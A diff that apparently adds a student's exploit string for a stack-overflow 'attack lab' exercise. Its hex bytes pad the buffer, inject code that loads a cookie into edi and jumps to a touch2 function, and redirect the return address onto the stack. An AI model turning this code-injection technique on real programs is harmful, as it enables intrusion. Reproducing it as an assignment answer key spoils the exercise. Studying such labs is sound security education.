@@ -1,0 +1,11 @@
+
+30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 /* fills up the stack everything extra is the return address now */
+bf fa 97 b9 59 /* moves cookie to edi */
+41 bc ec 17 40 00 /* moves touch2 pointer to r12d */
+44 89 24 24 /* moves touch2 pointer to top of stack */
+c3 /* ideally, returns to touch2 */
+
+ec 17 40 00  /* Return redirect */
+
+(stack at 0x5561dca0 at the end)
+(touch 2 at )0x004017ec
